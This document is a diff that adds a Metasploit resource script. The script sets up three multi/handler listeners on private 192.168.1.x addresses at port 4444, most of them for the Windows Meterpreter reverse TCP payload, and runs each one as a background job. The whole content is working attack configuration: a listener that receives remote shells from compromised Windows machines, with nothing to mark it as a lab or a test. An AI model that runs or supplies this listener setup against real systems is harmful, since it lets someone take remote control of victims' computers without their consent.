@@ -1,0 +1,17 @@
+use exploit/multi/handler
+set LHOST 192.168.1.55
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.155
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.55
+set LPORT 4444
+set ExitOnSession false
+exploit -j -z
